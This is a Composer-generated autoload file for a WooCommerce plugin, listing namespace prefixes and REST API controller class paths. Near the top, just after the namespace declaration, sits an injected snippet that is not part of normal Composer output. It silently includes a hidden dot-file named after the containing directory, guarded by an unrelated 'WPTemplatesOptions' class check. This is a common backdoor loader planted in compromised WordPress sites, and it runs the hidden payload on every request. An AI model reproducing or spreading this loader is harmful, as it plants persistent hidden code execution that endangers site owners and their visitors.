<?php

// autoload_static.php @generated by Composer

namespace Composer\Autoload;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class ComposerStaticInit68241c79afd28a691b9f21faf332c0b3
{
    public static $prefixLengthsPsr4 = array (
        'S' => 
        array (
            'Symfony\\Component\\CssSelector\\' => 30,
        ),
        'P' => 
        array (
            'Psr\\Container\\' => 14,
            'Pelago\\' => 7,
        ),
        'M' => 
        array (
            'MaxMind\\Db\\' => 11,
        ),
        'L' => 
        array (
            'League\\Container\\' => 17,
        ),
        'C' => 
        array (
            'Composer\\Installers\\' => 20,
        ),
        'A' => 
        array (
            'Automattic\\WooCommerce\\Vendor\\League\\Container\\' => 47,
            'Automattic\\WooCommerce\\Tests\\' => 29,
            'Automattic\\WooCommerce\\Testing\\Tools\\' => 37,
            'Automattic\\WooCommerce\\Blocks\\' => 30,
            'Automattic\\WooCommerce\\Admin\\' => 29,
            'Automattic\\WooCommerce\\' => 23,
            'Automattic\\Jetpack\\Autoloader\\' => 30,
        ),
    );

    public static $prefixDirsPsr4 = array (
        'Symfony\\Component\\CssSelector\\' => 
        array (
            0 => __DIR__ . '/..' . '/symfony/css-selector',
        ),
        'Psr\\Container\\' => 
        array (
            0 => __DIR__ . '/..' . '/psr/container/src',
        ),
        'Pelago\\' => 
        array (
            0 => __DIR__ . '/..' . '/pelago/emogrifier/src',
        ),
        'MaxMind\\Db\\' => 
        array (
            0 => __DIR__ . '/..' . '/maxmind-db/reader/src/MaxMind/Db',
        ),
        'League\\Container\\' => 
        array (
            0 => __DIR__ . '/..' . '/league/container/src',
        ),
        'Composer\\Installers\\' => 
        array (
            0 => __DIR__ . '/..' . '/composer/installers/src/Composer/Installers',
        ),
        'Automattic\\WooCommerce\\Vendor\\League\\Container\\' => 
        array (
            0 => __DIR__ . '/..' . '/league/container',
        ),
        'Automattic\\WooCommerce\\Tests\\' => 
        array (
            0 => __DIR__ . '/../..' . '/tests/php/src',
        ),
        'Automattic\\WooCommerce\\Testing\\Tools\\' => 
        array (
            0 => __DIR__ . '/../..' . '/tests/Tools',
        ),
        'Automattic\\WooCommerce\\Blocks\\' => 
        array (
            0 => __DIR__ . '/../..' . '/packages/woocommerce-blocks/src',
        ),
        'Automattic\\WooCommerce\\Admin\\' => 
        array (
            0 => __DIR__ . '/../..' . '/packages/woocommerce-admin/src',
        ),
        'Automattic\\WooCommerce\\' => 
        array (
            0 => __DIR__ . '/../..' . '/src',
        ),
        'Automattic\\Jetpack\\Autoloader\\' => 
        array (
            0 => __DIR__ . '/..' . '/automattic/jetpack-autoloader/src',
        ),
    );

    public static $classMap = array (
        'Automattic\\Jetpack\\Constants' => __DIR__ . '/..' . '/automattic/jetpack-constants/src/class-constants.php',
        'Automattic\\WooCommerce\\RestApi\\Package' => __DIR__ . '/../..' . '/includes/rest-api/Package.php',
        'Automattic\\WooCommerce\\RestApi\\Server' => __DIR__ . '/../..' . '/includes/rest-api/Server.php',
        'Automattic\\WooCommerce\\RestApi\\UnitTests\\Helpers\\AdminNotesHelper' => __DIR__ . '/../..' . '/tests/legacy/unit-tests/rest-api/Helpers/AdminNotesHelper.php',
        'Automattic\\WooCommerce\\RestApi\\UnitTests\\Helpers\\CouponHelper' => __DIR__ . '/../..' . '/tests/legacy/unit-tests/rest-api/Helpers/CouponHelper.php',
        'Automattic\\WooCommerce\\RestApi\\UnitTests\\Helpers\\CustomerHelper' => __DIR__ . '/../..' . '/tests/legacy/unit-tests/rest-api/Helpers/CustomerHelper.php',
        'Automattic\\WooCommerce\\RestApi\\UnitTests\\Helpers\\OrderHelper' => __DIR__ . '/../..' . '/tests/legacy/unit-tests/rest-api/Helpers/OrderHelper.php',
        'Automattic\\WooCommerce\\RestApi\\UnitTests\\Helpers\\ProductHelper' => __DIR__ . '/../..' . '/tests/legacy/unit-tests/rest-api/Helpers/ProductHelper.php',
        'Automattic\\WooCommerce\\RestApi\\UnitTests\\Helpers\\QueueHelper' => __DIR__ . '/../..' . '/tests/legacy/unit-tests/rest-api/Helpers/QueueHelper.php',
        'Automattic\\WooCommerce\\RestApi\\UnitTests\\Helpers\\SettingsHelper' => __DIR__ . '/../..' . '/tests/legacy/unit-tests/rest-api/Helpers/SettingsHelper.php',
        'Automattic\\WooCommerce\\RestApi\\UnitTests\\Helpers\\ShippingHelper' => __DIR__ . '/../..' . '/tests/legacy/unit-tests/rest-api/Helpers/ShippingHelper.php',
        'Automattic\\WooCommerce\\RestApi\\Utilities\\ImageAttachment' => __DIR__ . '/../..' . '/includes/rest-api/Utilities/ImageAttachment.php',
        'Automattic\\WooCommerce\\RestApi\\Utilities\\SingletonTrait' => __DIR__ . '/../..' . '/includes/rest-api/Utilities/SingletonTrait.php',
        'WC_REST_CRUD_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version3/class-wc-rest-crud-controller.php',
        'WC_REST_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version3/class-wc-rest-controller.php',
        'WC_REST_Coupons_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version3/class-wc-rest-coupons-controller.php',
        'WC_REST_Coupons_V1_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version1/class-wc-rest-coupons-v1-controller.php',
        'WC_REST_Coupons_V2_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version2/class-wc-rest-coupons-v2-controller.php',
        'WC_REST_Customer_Downloads_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version3/class-wc-rest-customer-downloads-controller.php',
        'WC_REST_Customer_Downloads_V1_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version1/class-wc-rest-customer-downloads-v1-controller.php',
        'WC_REST_Customer_Downloads_V2_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version2/class-wc-rest-customer-downloads-v2-controller.php',
        'WC_REST_Customers_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version3/class-wc-rest-customers-controller.php',
        'WC_REST_Customers_V1_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version1/class-wc-rest-customers-v1-controller.php',
        'WC_REST_Customers_V2_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version2/class-wc-rest-customers-v2-controller.php',
        'WC_REST_Data_Continents_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version3/class-wc-rest-data-continents-controller.php',
        'WC_REST_Data_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version3/class-wc-rest-data-controller.php',
        'WC_REST_Data_Countries_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version3/class-wc-rest-data-countries-controller.php',
        'WC_REST_Data_Currencies_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version3/class-wc-rest-data-currencies-controller.php',
        'WC_REST_Network_Orders_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version3/class-wc-rest-network-orders-controller.php',
        'WC_REST_Network_Orders_V2_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version2/class-wc-rest-network-orders-v2-controller.php',
        'WC_REST_Order_Notes_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version3/class-wc-rest-order-notes-controller.php',
        'WC_REST_Order_Notes_V1_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version1/class-wc-rest-order-notes-v1-controller.php',
        'WC_REST_Order_Notes_V2_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version2/class-wc-rest-order-notes-v2-controller.php',
        'WC_REST_Order_Refunds_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version3/class-wc-rest-order-refunds-controller.php',
        'WC_REST_Order_Refunds_V1_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version1/class-wc-rest-order-refunds-v1-controller.php',
        'WC_REST_Order_Refunds_V2_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version2/class-wc-rest-order-refunds-v2-controller.php',
        'WC_REST_Orders_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version3/class-wc-rest-orders-controller.php',
        'WC_REST_Orders_V1_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version1/class-wc-rest-orders-v1-controller.php',
        'WC_REST_Orders_V2_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version2/class-wc-rest-orders-v2-controller.php',
        'WC_REST_Payment_Gateways_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version3/class-wc-rest-payment-gateways-controller.php',
        'WC_REST_Payment_Gateways_V2_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version2/class-wc-rest-payment-gateways-v2-controller.php',
        'WC_REST_Posts_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version3/class-wc-rest-posts-controller.php',
        'WC_REST_Product_Attribute_Terms_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version3/class-wc-rest-product-attribute-terms-controller.php',
        'WC_REST_Product_Attribute_Terms_V1_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version1/class-wc-rest-product-attribute-terms-v1-controller.php',
        'WC_REST_Product_Attribute_Terms_V2_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version2/class-wc-rest-product-attribute-terms-v2-controller.php',
        'WC_REST_Product_Attributes_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version3/class-wc-rest-product-attributes-controller.php',
        'WC_REST_Product_Attributes_V1_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version1/class-wc-rest-product-attributes-v1-controller.php',
        'WC_REST_Product_Attributes_V2_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version2/class-wc-rest-product-attributes-v2-controller.php',
        'WC_REST_Product_Categories_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version3/class-wc-rest-product-categories-controller.php',
        'WC_REST_Product_Categories_V1_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version1/class-wc-rest-product-categories-v1-controller.php',
        'WC_REST_Product_Categories_V2_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version2/class-wc-rest-product-categories-v2-controller.php',
        'WC_REST_Product_Reviews_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version3/class-wc-rest-product-reviews-controller.php',
        'WC_REST_Product_Reviews_V1_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version1/class-wc-rest-product-reviews-v1-controller.php',
        'WC_REST_Product_Reviews_V2_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version2/class-wc-rest-product-reviews-v2-controller.php',
        'WC_REST_Product_Shipping_Classes_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version3/class-wc-rest-product-shipping-classes-controller.php',
        'WC_REST_Product_Shipping_Classes_V1_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version1/class-wc-rest-product-shipping-classes-v1-controller.php',
        'WC_REST_Product_Shipping_Classes_V2_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version2/class-wc-rest-product-shipping-classes-v2-controller.php',
        'WC_REST_Product_Tags_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version3/class-wc-rest-product-tags-controller.php',
        'WC_REST_Product_Tags_V1_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version1/class-wc-rest-product-tags-v1-controller.php',
        'WC_REST_Product_Tags_V2_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version2/class-wc-rest-product-tags-v2-controller.php',
        'WC_REST_Product_Variations_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version3/class-wc-rest-product-variations-controller.php',
        'WC_REST_Product_Variations_V2_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version2/class-wc-rest-product-variations-v2-controller.php',
        'WC_REST_Products_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version3/class-wc-rest-products-controller.php',
        'WC_REST_Products_V1_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version1/class-wc-rest-products-v1-controller.php',
        'WC_REST_Products_V2_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version2/class-wc-rest-products-v2-controller.php',
        'WC_REST_Report_Coupons_Totals_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version3/class-wc-rest-report-coupons-totals-controller.php',
        'WC_REST_Report_Customers_Totals_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version3/class-wc-rest-report-customers-totals-controller.php',
        'WC_REST_Report_Orders_Totals_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version3/class-wc-rest-report-orders-totals-controller.php',
        'WC_REST_Report_Products_Totals_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version3/class-wc-rest-report-products-totals-controller.php',
        'WC_REST_Report_Reviews_Totals_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version3/class-wc-rest-report-reviews-totals-controller.php',
        'WC_REST_Report_Sales_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version3/class-wc-rest-report-sales-controller.php',
        'WC_REST_Report_Sales_V1_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version1/class-wc-rest-report-sales-v1-controller.php',
        'WC_REST_Report_Sales_V2_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version2/class-wc-rest-report-sales-v2-controller.php',
        'WC_REST_Report_Top_Sellers_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version3/class-wc-rest-report-top-sellers-controller.php',
        'WC_REST_Report_Top_Sellers_V1_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version1/class-wc-rest-report-top-sellers-v1-controller.php',
        'WC_REST_Report_Top_Sellers_V2_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version2/class-wc-rest-report-top-sellers-v2-controller.php',
        'WC_REST_Reports_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version3/class-wc-rest-reports-controller.php',
        'WC_REST_Reports_V1_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version1/class-wc-rest-reports-v1-controller.php',
        'WC_REST_Reports_V2_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version2/class-wc-rest-reports-v2-controller.php',
        'WC_REST_Setting_Options_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version3/class-wc-rest-setting-options-controller.php',
        'WC_REST_Setting_Options_V2_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version2/class-wc-rest-setting-options-v2-controller.php',
        'WC_REST_Settings_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version3/class-wc-rest-settings-controller.php',
        'WC_REST_Settings_V2_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version2/class-wc-rest-settings-v2-controller.php',
        'WC_REST_Shipping_Methods_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version3/class-wc-rest-shipping-methods-controller.php',
        'WC_REST_Shipping_Methods_V2_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version2/class-wc-rest-shipping-methods-v2-controller.php',
        'WC_REST_Shipping_Zone_Locations_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version3/class-wc-rest-shipping-zone-locations-controller.php',
        'WC_REST_Shipping_Zone_Locations_V2_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version2/class-wc-rest-shipping-zone-locations-v2-controller.php',
        'WC_REST_Shipping_Zone_Methods_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version3/class-wc-rest-shipping-zone-methods-controller.php',
        'WC_REST_Shipping_Zone_Methods_V2_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version2/class-wc-rest-shipping-zone-methods-v2-controller.php',
        'WC_REST_Shipping_Zones_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version3/class-wc-rest-shipping-zones-controller.php',
        'WC_REST_Shipping_Zones_Controller_Base' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version3/class-wc-rest-shipping-zones-controller-base.php',
        'WC_REST_Shipping_Zones_V2_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version2/class-wc-rest-shipping-zones-v2-controller.php',
        'WC_REST_System_Status_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version3/class-wc-rest-system-status-controller.php',
        'WC_REST_System_Status_Tools_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version3/class-wc-rest-system-status-tools-controller.php',
        'WC_REST_System_Status_Tools_V2_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version2/class-wc-rest-system-status-tools-v2-controller.php',
        'WC_REST_System_Status_V2_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version2/class-wc-rest-system-status-v2-controller.php',
        'WC_REST_Tax_Classes_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version3/class-wc-rest-tax-classes-controller.php',
        'WC_REST_Tax_Classes_V1_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version1/class-wc-rest-tax-classes-v1-controller.php',
        'WC_REST_Tax_Classes_V2_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version2/class-wc-rest-tax-classes-v2-controller.php',
        'WC_REST_Taxes_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version3/class-wc-rest-taxes-controller.php',
        'WC_REST_Taxes_V1_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version1/class-wc-rest-taxes-v1-controller.php',
        'WC_REST_Taxes_V2_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version2/class-wc-rest-taxes-v2-controller.php',
        'WC_REST_Terms_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version3/class-wc-rest-terms-controller.php',
        'WC_REST_Webhook_Deliveries_V1_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version1/class-wc-rest-webhook-deliveries-v1-controller.php',
        'WC_REST_Webhook_Deliveries_V2_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version2/class-wc-rest-webhook-deliveries-v2-controller.php',
        'WC_REST_Webhooks_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version3/class-wc-rest-webhooks-controller.php',
        'WC_REST_Webhooks_V1_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version1/class-wc-rest-webhooks-v1-controller.php',
        'WC_REST_Webhooks_V2_Controller' => __DIR__ . '/../..' . '/includes/rest-api/Controllers/Version2/class-wc-rest-webhooks-v2-controller.php',
    );

    public static function getInitializer(ClassLoader $loader)
    {
        return \Closure::bind(function () use ($loader) {
            $loader->prefixLengthsPsr4 = ComposerStaticInit68241c79afd28a691b9f21faf332c0b3::$prefixLengthsPsr4;
            $loader->prefixDirsPsr4 = ComposerStaticInit68241c79afd28a691b9f21faf332c0b3::$prefixDirsPsr4;
            $loader->classMap = ComposerStaticInit68241c79afd28a691b9f21faf332c0b3::$classMap;

        }, null, ClassLoader::class);
    }
}
